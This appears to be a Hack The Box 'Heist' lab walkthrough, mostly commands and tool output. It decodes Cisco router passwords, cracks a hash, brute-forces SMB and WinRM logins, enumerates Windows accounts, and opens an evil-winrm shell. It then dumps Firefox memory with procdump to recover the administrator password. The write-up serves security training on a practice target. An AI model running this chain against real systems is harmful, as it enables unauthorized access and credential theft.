@@ -1,0 +1,710 @@
+# 1. Port scanning with nmap - -sC (default scripts)
+# -sV (enumerate versions); -oA (output all formats) nmap directory called heist
+
+    nmap -sC -sV -oA nmap/heistNOPN 10.10.10.149
+
+        # Nmap 7.80 scan initiated Sat Apr 11 11:27:11 2020 as: nmap -sC -sV -oA nmap/heistNOPN 10.10.10.149
+        Nmap scan report for 10.10.10.149
+        Host is up (0.029s latency).
+        Not shown: 997 filtered ports
+        PORT    STATE SERVICE    VERSION
+        80/tcp  open  tcpwrapped
+        |_http-server-header: Microsoft-IIS/10.0
+        135/tcp open  tcpwrapped
+        445/tcp open  tcpwrapped
+
+        Host script results:
+        | smb2-security-mode:
+        |   3.11:
+        |_    Message signing enabled but not required
+        |_smb2-time: Protocol negotiation failed (SMB2)
+
+        Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+        # Nmap done at Sat Apr 11 11:28:08 2020 -- 1 IP address (1 host up) scanned in 56.91 seconds
+
+
+    sudo nmap -Pn -sC -sV -oA heist 10.10.10.149 (preferred)
+
+        # Nmap 7.80 scan initiated Sat Apr 11 11:20:09 2020 as: nmap -Pn -sC -sV -oA nmap/heist 10.10.10.149
+        Nmap scan report for 10.10.10.149
+        Host is up (0.13s latency).
+        Not shown: 997 filtered ports
+        PORT    STATE SERVICE       VERSION
+        80/tcp  open  http          Microsoft IIS httpd 10.0
+        | http-cookie-flags:
+        |   /:
+        |     PHPSESSID:
+        |_      httponly flag not set
+        | http-methods:
+        |_  Potentially risky methods: TRACE
+        |_http-server-header: Microsoft-IIS/10.0
+        | http-title: Support Login Page
+        |_Requested resource was login.php
+        135/tcp open  msrpc         Microsoft Windows RPC
+        445/tcp open  microsoft-ds?
+        Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+        Host script results:
+        |_clock-skew: 1m09s
+        | smb2-security-mode:
+        |   2.02:
+        |_    Message signing enabled but not required
+        | smb2-time:
+        |   date: 2020-04-11T15:22:39
+        |_  start_date: N/A
+
+        Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+        # Nmap done at Sat Apr 11 11:22:06 2020 -- 1 IP address (1 host up) scanned in 117.47 seconds
+
+
+# 2. Web server enumeration 
+
+    Browser to 10.10.10.149. /login.php should appear 
+
+    Navigating to "log in as guest" gives us an attachment in a trouble ticket. (http://10.10.10.149/attachments/config.txt)
+
+    Attachment contains cisco RTR configuration with type 7 "encryption" masking the passwords 
+    (0242114B0E143F015F5D1E161713 = $ uperP@ssword
+    02375012182C1A1D751618034F36415408 = Q4)sJu\Y8qz*A3?d)
+
+    cd /opt > git clone https://github.com/theevilbit/ciscot7 > and run ciscot7.py to decrypt the hashes 
+
+        python ciscot7.py -p <hash>
+
+    A        winnie@kali:/opt/ciscot7$ python ciscot7.py -p 02375012182C1A1D751618034F36415408
+    B            Decrypted password: Q4)sJu\Y8qz*A3?d
+
+                #-e encrypts the password
+            winnie@kali:/opt/ciscot7$ python ciscot7.py -e -p 02375012182C1A1D751618034F36415408
+                Encrypted password: 06565d721b1b594857464a592f550b7a007f666474425f465055700a0e07055b57484e
+
+    # Hashcat md5 hash in cisco configuration
+
+        hashcat --example-hashes | grep -B2 '\$1\$'
+
+            MODE: 500
+            TYPE: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
+            HASH: $1$38652870$DUjsu4TTlTsOe/xxZ05uf/
+            --
+            MODE: 12200
+            TYPE: eCryptfs
+            HASH: $ecryptfs$0$1$4207883745556753$567daa975114206c
+            --
+            MODE: 16700
+            TYPE: FileVault 2
+            HASH: $fvde$1$16$84286044060108438487434858307513$20000$f1620ab93192112f0a23eea89b5d4df065661f974b704191
+
+
+        hashcat --example-hashes | grep -i cisco -A3
+
+            TYPE: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
+            HASH: $1$38652870$DUjsu4TTlTsOe/xxZ05uf/
+            PASS: hashcat
+
+            --
+            TYPE: Cisco-PIX MD5
+            HASH: dRRVnUmUHXOTt9nk
+            PASS: hashcat
+
+            --
+            TYPE: Cisco-ASA MD5
+            HASH: YjDBNr.A0AN7DA8s:4684
+            PASS: hashcat
+
+            --
+            TYPE: Cisco-IOS type 4 (SHA256)
+            HASH: 2btjjy78REtmYkkW0csHUbJZOstRXoWdX1mGrmmfeHI
+            PASS: hashcat
+
+            --
+            TYPE: Cisco-IOS $8$ (PBKDF2-SHA256)
+            HASH: $8$84486783037343$pYNyVrtyMalQrZLxRi7ZLQS1Fl.jkYCgASUi5P8JNb2
+            PASS: hashcat
+
+            --
+            TYPE: Cisco-IOS $9$ (scrypt)
+            HASH: $9$87023684531115$phio0TBQwaO7KZ8toQFyGFyDvyOzidaypRWN0uKX0hU
+            PASS: hashcat
+    C       #(Do not run hashcat on Kali VM as it does not support GPU - Support for OpenCL drivers in Windows is available)
+                ./hashcat64.exe -m 500 heist-cisco-md5 rockyou.txt --force --show
+                    
+                    $1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent
+
+    D       # Create users.txt and passwords.txt to pass as lists in text file to crackmapexec
+
+                 sudo crackmapexec smb -u users.txt -p passwords.txt --shares 10.10.10.149
+
+
+SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SUPPORTDESK) (signing:False) (SMBv1:False)
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SUPPORTDESK\rout3r:$uperP@ssword STATUS_LOGON_FAILURE
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SUPPORTDESK\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SUPPORTDESK\rout3r:stealth1agent STATUS_LOGON_FAILURE
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SUPPORTDESK\admin:$uperP@ssword STATUS_LOGON_FAILURE
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SUPPORTDESK\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SUPPORTDESK\admin:stealth1agent STATUS_LOGON_FAILURE
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SUPPORTDESK\hazard:$uperP@ssword STATUS_LOGON_FAILURE
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SUPPORTDESK\hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
+SMB         10.10.10.149    445    SUPPORTDESK      [+] SUPPORTDESK\hazard:stealth1agent
+SMB         10.10.10.149    445    SUPPORTDESK      [+] Enumerated shares
+SMB         10.10.10.149    445    SUPPORTDESK      Share           Permissions     Remark
+SMB         10.10.10.149    445    SUPPORTDESK      -----           -----------     ------
+SMB         10.10.10.149    445    SUPPORTDESK      ADMIN$                          Remote Admin
+SMB         10.10.10.149    445    SUPPORTDESK      C$                              Default share
+SMB         10.10.10.149    445    SUPPORTDESK      IPC$            READ            Remote IPC
+
+    E       # Metasploit Framework Database pre-load 
+                msfdb run
+    F       # use MSF module for bruteforce smb login 
+                auxiliary/scanner/smb/smb_login 
+    G       # set global variables to user and password lists files 
+                setg USER_FILE --> users file with wordlist
+                setg PASS_FILE --> passwords file with wordlist
+                setg RHOSTS 10.10.10.149 --> heist
+    H       # Execute
+                msf5 auxiliary(scanner/smb/smb_login) > run
+
+[*] 10.10.10.149:445      - 10.10.10.149:445 - Starting SMB login bruteforce
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\rout3r:$uperP@ssword',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\rout3r:Q4)sJu\Y8qz*A3?d',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\rout3r:stealth1agent',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\admin:$uperP@ssword',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\admin:Q4)sJu\Y8qz*A3?d',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\admin:stealth1agent',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\hazard:$uperP@ssword',
+[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\hazard:Q4)sJu\Y8qz*A3?d',
+[+] 10.10.10.149:445      - 10.10.10.149:445 - Success: '.\hazard:stealth1agent'
+[*] 10.10.10.149:445      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+    I       # Save found combination as credentials with SRC IP, TCP/UDP ports, etc. 
+            creds
+
+Credentials
+===========
+
+host          origin        service        public  private        realm  private_type  JtR Format
+----          ------        -------        ------  -------        -----  ------------  ----------
+10.10.10.149  10.10.10.149  445/tcp (smb)  hazard  stealth1agent         Password
+
+    J       # Load winRM module - Global variables are already set 
+
+                use auxiliary/scanner/winrm/winrm_login
+
+                    run 
+
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\rout3r:$uperP@ssword (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\rout3r:Q4)sJu\Y8qz*A3?d (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\rout3r:stealth1agent (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\admin:$uperP@ssword (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\admin:Q4)sJu\Y8qz*A3?d (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\admin:stealth1agent (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\hazard:$uperP@ssword (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\hazard:Q4)sJu\Y8qz*A3?d (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\hazard:stealth1agent (Incorrect: )
+                        [*] Scanned 1 of 1 hosts (100% complete)
+                        [*] Auxiliary module execution completed
+
+    K       # Change directory to python3-impacket folder examples/ or "locate psexec.py" to find the directory
+
+                cd /usr/share/doc/python3-impacket/examples/
+    L       #  Lookup SID - RID brute force CID brute force ?
+                python3 lookupsid.py 'hazard:stealth1agent'@10.10.10.149 
+                
+                    Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+                    [*] Brute forcing SIDs at 10.10.10.149
+                    [*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
+                    [*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
+                    500: SUPPORTDESK\Administrator (SidTypeUser)
+                    501: SUPPORTDESK\Guest (SidTypeUser)
+                    503: SUPPORTDESK\DefaultAccount (SidTypeUser)
+                    504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
+                    513: SUPPORTDESK\None (SidTypeGroup)
+                    1008: SUPPORTDESK\Hazard (SidTypeUser)
+                    1009: SUPPORTDESK\support (SidTypeUser)
+                    1012: SUPPORTDESK\Chase (SidTypeUser)
+                    1013: SUPPORTDESK\Jason (SidTypeUser)
+
+    M       # Add chase, jason and support to users.txt files in 
+                sudo vi ~Documents/htb/boxes/heist/access/users.txt
+    N       # Connect to RPC port with given credentials % between user and pwd to get SID - Security Identifier
+                sudo rpcclient -U 'hazard%stealth1agent' 10.10.10.149
+                    lookupnames administrator
+                        administrator S-1-5-21-4254423774-1266059056-3197185112-500 (User: 1)
+                            Domain - 21-4254423774-1266059056-3197185112-
+                            User - 500 (default for Administrator in Win)
+                    lookupnames guest
+                        guest S-1-5-21-4254423774-1266059056-3197185112-501 (User: 1)
+                            Domain - 21-4254423774-1266059056-3197185112
+                            User - 501 (guest)                                      
+    O       # Bruteforce SIDs - Instead of lookupnames, we use the Domain portion of the SIDs obtained before
+            # and lookup up username by SID by following (user+n)
+                rpcclient $>
+                    lookupsids S-1-5-21-4254423774-1266059056-3197185112-503
+                        S-1-5-21-4254423774-1266059056-3197185112-503 SUPPORTDESK\DefaultAccount (1)
+                            Domain - 21-4254423774-1266059056-3197185112- 
+                            User - 503 (DefaultAccount)
+    P       # Lookup username found in Cisco config earlier - "hazard"
+                rpcclient $>
+                    lookupnames hazard
+                        hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)
+                            Domain - 21-4254423774-1266059056-3197185112
+                            User - 1008 (hazard)
+    Q       # Rinse and repeat for users 1009-1020, 1025
+
+                rpcclient $> 
+                
+                lookupsids S-1-5-21-4254423774-1266059056-3197185112-1009
+                S-1-5-21-4254423774-1266059056-3197185112-1009 SUPPORTDESK\support (1)
+                
+                lookupsids S-1-5-21-4254423774-1266059056-3197185112-1010
+                S-1-5-21-4254423774-1266059056-3197185112-1010 *unknown*\*unknown* (8)
+                
+                lookupsids S-1-5-21-4254423774-1266059056-3197185112-1012
+                S-1-5-21-4254423774-1266059056-3197185112-1012 SUPPORTDESK\Chase (1)
+                
+                lookupsids S-1-5-21-4254423774-1266059056-3197185112-1013
+                S-1-5-21-4254423774-1266059056-3197185112-1013 SUPPORTDESK\Jason (1)
+                
+                lookupsids S-1-5-21-4254423774-1266059056-3197185112-1020
+                S-1-5-21-4254423774-1266059056-3197185112-1020 *unknown*\*unknown* (8)
+                                
+    R       # Back to MSF - ensure global variables with user, password and target are set
+                msf5 > use auxiliary/scanner/smb/smb_login  
+                msf5 auxiliary(scanner/smb/smb_login) > run                                         
+                                                                                                
+                    [*] 10.10.10.149:445 - 10.10.10.149:445 - Starting SMB login bruteforce        
+                    [-] 10.10.10.149:445 - 10.10.10.149:445 - Failed: '.\rout3r:$uperP@ssword',    
+                    [-] 10.10.10.149:445 - 10.10.10.149:445 - Failed: '.\rout3r:Q4)sJu\Y8qz*A3?d', 
+                    [-] 10.10.10.149:445 - 10.10.10.149:445 - Failed: '.\rout3r:stealth1agent',    
+                    [-] 10.10.10.149:445 - 10.10.10.149:445 - Failed: '.\admin:$uperP@ssword',     
+                    [-] 10.10.10.149:445 - 10.10.10.149:445 - Failed: '.\admin:Q4)sJu\Y8qz*A3?d',  
+                    [-] 10.10.10.149:445 - 10.10.10.149:445 - Failed: '.\admin:stealth1agent',     
+                    [-] 10.10.10.149:445 - 10.10.10.149:445 - Failed: '.\hazard:$uperP@ssword',    
+                    [-] 10.10.10.149:445 - 10.10.10.149:445 - Failed: '.\hazard:Q4)sJu\Y8qz*A3?d', 
+                    [+] 10.10.10.149:445 - 10.10.10.149:445 - Success: '.\hazard:stealth1agent'    
+                    [-] 10.10.10.149:445 - 10.10.10.149:445 - Failed: '.\jason:$uperP@ssword',     
+                    [-] 10.10.10.149:445 - 10.10.10.149:445 - Failed: '.\jason:Q4)sJu\Y8qz*A3?d',  
+                    [-] 10.10.10.149:445 - 10.10.10.149:445 - Failed: '.\jason:stealth1agent',     
+                    [-] 10.10.10.149:445 - 10.10.10.149:445 - Failed: '.\chase:$uperP@ssword',     
+                    [+] 10.10.10.149:445 - 10.10.10.149:445 - Success: '.\chase:Q4)sJu\Y8qz*A3?d'  
+                    [-] 10.10.10.149:445 - 10.10.10.149:445 - Failed: '.\support:$uperP@ssword',   
+                    [-] 10.10.10.149:445 - 10.10.10.149:445 - Failed: '.\support:Q4)sJu\Y8qz*A3?d',
+                    [-] 10.10.10.149:445 - 10.10.10.149:445 - Failed: '.\support:stealth1agent',   
+                    [-] 10.10.10.149:445 - 10.10.10.149:445 - Failed: '.\:$uperP@ssword',          
+                    [-] 10.10.10.149:445 - 10.10.10.149:445 - Failed: '.\:Q4)sJu\Y8qz*A3?d',       
+                    [-] 10.10.10.149:445 - 10.10.10.149:445 - Failed: '.\:stealth1agent',          
+                    [*] 10.10.10.149:445 - Scanned 1 of 1 hosts (100% complete)                    
+                    [*] Auxiliary module execution completed 
+    S           # After discovering new user chase, we will test for Windows logins
+    T            msf5>
+                    use scanner/winrm/winrm_login
+                    set USER_FILE users.txt
+                    set USERNAME chase
+                    SET PASS_FILE passwords.txt
+                    run
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\chase:$uperP@ssword (Incorrect: )
+                        [+] 10.10.10.149:5985 - Login Successful: WORKSTATION\chase:Q4)sJu\Y8qz*A3?d
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\rout3r:$uperP@ssword (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\rout3r:Q4)sJu\Y8qz*A3?d (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\rout3r:stealth1agent (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\admin:$uperP@ssword (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\admin:Q4)sJu\Y8qz*A3?d (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\admin:stealth1agent (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\hazard:$uperP@ssword (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\hazard:Q4)sJu\Y8qz*A3?d (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\hazard:stealth1agent (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\jason:$uperP@ssword (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\jason:Q4)sJu\Y8qz*A3?d (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\jason:stealth1agent (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\support:$uperP@ssword (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\support:Q4)sJu\Y8qz*A3?d (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\support:stealth1agent (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\:$uperP@ssword (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\:Q4)sJu\Y8qz*A3?d (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\:stealth1agent (Incorrect: )
+                        [*] Scanned 1 of 1 hosts (100% complete)
+                        [*] Auxiliary module execution completed
+
+    U           #   Verify credentials gathered up to this point
+                    creds   
+                    
+                        Credentials
+                        ===========
+
+                        host          origin        service          public  private           realm        private_type  JtR Format
+                        ----          ------        -------          ------  -------           -----        ------------  ----------
+                        10.10.10.149  10.10.10.149  5985/tcp (http)  chase   Q4)sJu\Y8qz*A3?d  WORKSTATION  Password
+                        10.10.10.149  10.10.10.149  445/tcp (smb)    chase   Q4)sJu\Y8qz*A3?d               Password
+                        10.10.10.149  10.10.10.149  445/tcp (smb)    hazard  stealth1agent                  Password
+
+    V           # cd to opt folder to download winrm ruby file
+                    cd /opt/
+                    mkdir winrm
+                    cd /winrm 
+    W           # GIT dload
+                    git clone https://github.com/Hackplayers/evil-winrm
+                # Install winrm standalone ruby file ruby dependencies - to execute shell on target 
+                    sudo gem install winrm winrm-fs colorize stringio
+    X           # Execute WinRM on target
+                    sudo ruby evil-winrm.rb -u chase -p 'Q4)sJu\Y8qz*A3?d' -i 10.10.10.149
+    Y           # We're In.
+                    
+                    Evil-WinRM shell v2.3
+
+                    Info: Establishing connection to remote endpoint
+
+                    *Evil-WinRM* PS C:\Users\Chase\Documents> whoami
+                    supportdesk\chase
+                    *Evil-WinRM* PS C:\Users\Chase\Documents> ipconfig /all
+
+                    Windows IP Configuration
+
+                    Host Name . . . . . . . . . . . . : SupportDesk
+                    Primary Dns Suffix  . . . . . . . :
+                    Node Type . . . . . . . . . . . . : Hybrid
+                    IP Routing Enabled. . . . . . . . : No
+                    WINS Proxy Enabled. . . . . . . . : No
+
+                    Ethernet adapter Ethernet0:
+
+                    Connection-specific DNS Suffix  . :
+                    Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
+                    Physical Address. . . . . . . . . : 00-50-56-B9-6B-6C
+                    DHCP Enabled. . . . . . . . . . . : No
+                    Autoconfiguration Enabled . . . . : Yes
+                    IPv6 Address. . . . . . . . . . . : dead:beef::d0b0:3103:494f:c01(Preferred)
+                    Link-local IPv6 Address . . . . . : fe80::d0b0:3103:494f:c01%15(Preferred)
+                    IPv4 Address. . . . . . . . . . . : 10.10.10.149(Preferred)
+                    Subnet Mask . . . . . . . . . . . : 255.255.255.0
+                    Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:a0b9%15
+                                                        10.10.10.2
+                    DHCPv6 IAID . . . . . . . . . . . : 100666409
+                    DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-26-23-90-08-00-50-56-B9-6B-6C
+                    DNS Servers . . . . . . . . . . . : 10.10.10.2
+                    NetBIOS over Tcpip. . . . . . . . : Enabled
+                    *Evil-WinRM* PS C:\Users\Chase\Documents>
+
+    Z           # Enumerate directories 
+                    *Evil-WinRM* PS C:\Users\Chase>gci -recurse . | select fullname 
+                        FullName
+                        --------
+                        C:\Users\Chase\3D Objects
+                        C:\Users\Chase\Contacts
+                        C:\Users\Chase\Desktop
+                        C:\Users\Chase\Documents
+                        C:\Users\Chase\Downloads
+                        C:\Users\Chase\Favorites
+                        C:\Users\Chase\Links
+                        C:\Users\Chase\Music
+                        C:\Users\Chase\Pictures
+                        C:\Users\Chase\Saved Games
+                        C:\Users\Chase\Searches
+                        C:\Users\Chase\Videos
+                        C:\Users\Chase\Desktop\todo.txt
+                        C:\Users\Chase\Desktop\user.txt
+                        C:\Users\Chase\Favorites\Links
+                        C:\Users\Chase\Favorites\Bing.url
+                        C:\Users\Chase\Links\Desktop.lnk
+                        C:\Users\Chase\Links\Downloads.lnk
+                            gc todo.txt and user.txt 
+                                *Evil-WinRM* PS C:\Users\Chase\Desktop> gc todo.txt
+                                    Stuff to-do:
+                                    1. Keep checking the issues list.
+                                    2. Fix the router config.
+
+                                    Done:
+                                    1. Restricted access for guest user.
+                                    *Evil-WinRM* PS C:\Users\Chase\Desktop> gc user.txt
+                                    a127daef77ab6d9d92008653295f59c4
+                            Note: access to other folders is restricted. Enumeration on web server is next 
+                            cd C:\ gci ; cd inetpub (webserver folder) - since we cannot list the files in the wwwroot directory
+                            browsing to http://10.10.10.149/issues.php suggests to cat the contents of that file (issues.php)
+                                gc issues.php
+
+<!DOCTYPE html>
+<?php
+session_start();
+if( isset($_SESSION['admin']) || isset($_SESSION['guest']) ) {
+        if( $_SESSION['admin'] === "valid" || $_SESSION['guest'] === "valid" ) {
+
+?>
+<html lang="en" >
+
+<head>
+  <meta charset="UTF-8">
+  <title>Recent Issues</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <!-- Fuentes de Google -->
+        <link href='https://fonts.googleapis.com/css?family=Roboto:400,700' rel='stylesheet' type='text/css'>
+        <!-- Iconos -->
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
+
+
+      <link rel="stylesheet" href="css/issues.css">
+
+
+</head>
+
+<body>
+
+  <!-- Contenedor Principal -->
+        <div class="comments-container">
+                <h1>Issues</h1>
+
+                <ul id="comments-list" class="comments-list">
+                        <li>
+                                <div class="comment-main-level">
+                                        <!-- Avatar -->
+                                        <div class="comment-avatar"><img src="images/user.png" alt=""></div>
+                                        <!-- Contenedor del Comentario -->
+                                        <div class="comment-box">
+                                                <div class="comment-head">
+                                                        <h6 class="comment-name">Hazard</h6>
+                                                        <span>20 minutes ago</span>
+                                                        <i class="fa fa-reply"></i>
+                                                        <i class="fa fa-heart"></i>
+                                                </div>
+                                                <div class="comment-content">
+                                                Hi, I've been experiencing problems with my cisco router. Here's a part of the configuration the previous admin had been using. I'm new to this and don't know how to fix it. :(
+                                                <hr/>
+                                                <div><img src="images/clip.png" height="10" width="10" /><span>     <a href="attachments/config.txt">Attachment</a><span></div>
+                                                </div>
+                                        </div>
+                                </div>
+                                <!-- Respuestas de los comentarios -->
+                                <ul class="comments-list reply-list">
+                                        <li>
+                                                <!-- Avatar -->
+                                                <div class="comment-avatar"><img src="images/admin.png" alt=""></div>
+                                                <!-- Contenedor del Comentario -->
+                                                <div class="comment-box">
+                                                        <div class="comment-head">
+                                                                <h6 class="comment-name by-author">Support Admin</h6>
+                                                                <span>10 minutes ago</span>
+                                                                <i class="fa fa-reply"></i>
+                                                                <i class="fa fa-heart"></i>
+                                                        </div>
+                                                        <div class="comment-content">
+                                                        Hi, thanks for posting the issue here. We provide fast support and help. Let me take a look and get back to you!
+                                                        </div>
+                                                </div>
+                                        </li>
+
+                                        <li>
+                                                <!-- Avatar -->
+                                                <div class="comment-avatar"><img src="images/user.png" alt=""></div>
+                                                <!-- Contenedor del Comentario -->
+                                                <div class="comment-box">
+                                                        <div class="comment-head">
+                                                                <h6 class="comment-name">Hazard</h6>
+                                                                <span>10 minutes ago</span>
+                                                                <i class="fa fa-reply"></i>
+                                                                <i class="fa fa-heart"></i>
+                                                        </div>
+                                                        <div class="comment-content">
+                                                        Thanks a lot. Also, please create an account for me on the windows server as I need to access the files.
+                                                        </div>
+                                                </div>
+                                        </li>
+                                </ul>
+                        </li>
+
+        </div>
+
+
+
+</body>
+
+</html>
+<?php
+        }
+        else
+                header('Location: login.php');
+}
+else {
+                header('Location: login.php');
+}
+?>
+
+                                    type login.php on winrm:
+<!DOCTYPE html>
+<html lang="en" >
+
+<head>
+  <meta charset="UTF-8">
+  <title>Support Login Page</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css'>
+<link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css'>
+
+      <link rel="stylesheet" href="css/style.css">
+
+
+</head>
+
+<body>
+
+  <div id="particles-js"></div>
+<body class="login">
+        <div class="container">
+                <div class="login-container-wrapper clearfix">
+                        <div class="logo">
+                                <i class="fa fa-sign-in"></i>
+                        </div>
+                        <div class="welcome"><strong>Welcome,</strong> please login</div>
+
+                        <form class="form-horizontal login-form" method="POST" action="<?php echo $_SERVER['PHP_SELF']; ?>">
+                                <div class="form-group relative">
+                                        <input id="login_username" name="login_username" class="form-control input-lg" type="email" placeholder="Username" required>
+                                        <i class="fa fa-user"></i>
+                                </div>
+                                <div class="form-group relative password">
+                                        <input id="login_password" name="login_password" class="form-control input-lg" type="password" placeholder="Password" required>
+                                        <i class="fa fa-lock"></i>
+                                </div>
+                          <div class="form-group">
+                            <button name="login" type="submit" class="btn btn-success btn-lg btn-block">Login</button>
+                          </div>
+        <div class="checkbox pull-left">
+                            <label><input type="checkbox" name="remember"> Remember</label>
+                          </div>
+                          <div class="checkbox pull-right">
+                            <label> <a class="forget" href="/login.php?guest=true" title="forget">Login as guest</a> </label>
+                          </div>
+                        </form>
+                </div>
+
+    <h4 class="text-center">
+      <a target="_blank" href="">
+        24 x 7 Support
+      </a>
+    </h4>
+        </div>
+
+  </body>
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js'></script>
+<script src='https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script>
+
+
+
+    <script  src="js/index.js"></script>
+
+
+
+
+</body>
+<?php
+session_start();
+if( isset($_REQUEST['login']) && !empty($_REQUEST['login_username']) && !empty($_REQUEST['login_password'])) {
+        if( $_REQUEST['login_username'] === 'admin@support.htb' && hash( 'sha256', $_REQUEST['login_password']) === '91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0
+af4db9040') {
+                $_SESSION['admin'] = "valid";
+                header('Location: issues.php');
+        }
+        else
+                header('Location: errorpage.php');
+}
+else if( isset($_GET['guest']) ) {
+        if( $_GET['guest'] === 'true' ) {
+                $_SESSION['guest'] = "valid";
+                header('Location: issues.php');
+        }
+}
+
+
+?>
+</html>
+
+Nothing was found here nonetheless is very important to enumerate iteratively 
+
+    A1             # navigate back to root C:/ - enumerating installed programs show firefox 
+                        listing processes show firefox is running in 4 instances (could be dumped from memory)
+                            get-process
+                                   1158      76   180984     225588      53.56   1308   1 firefox
+                                    408      31    16948      62752       4.23   1524   1 firefox
+                                    358      26    16360      37608       0.89   3020   1 firefox
+                                    390      41   124464     155576      99.70   5044   1 firefox
+                        Save into a file "ff-pid.txt"
+    A2              # In order to dump process we will use sysinternals - https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
+                        procdump64.exe must be uploaded to target box
+                            from winrm-> upload sysinternals /home/winnie/Documents/htb/boxes/heist/procdump64.exe (Sysinternals writes entry in register)
+
+                            ./procdump64.exe -ma 4656 
+
+    A3              # After grep password | less "/password " we find:   admin@support.htb 4dD!5}x/re8]FBuZ w/ no additional features
+    4dD!5}x/re8]FBuZ
+
+    A4              # Add new password and user found (administrator and 4dD!5}x/re8]FBuZ to user and passwords text file ) and run winrm is MSFDB
+
+                        
+                        [+] 10.10.10.149:5985 - Login Successful: WORKSTATION\administrator:4dD!5}x/re8]FBuZ
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\jason:4dD!5}x/re8]FBuZ (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\jason:$uperP@ssword (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\jason:Q4)sJu\Y8qz*A3?d (Incorrect: )
+                        [-] 10.10.10.149:5985 - LOGIN FAILED: WORKSTATION\jason:stealth1agent (Incorrect: )
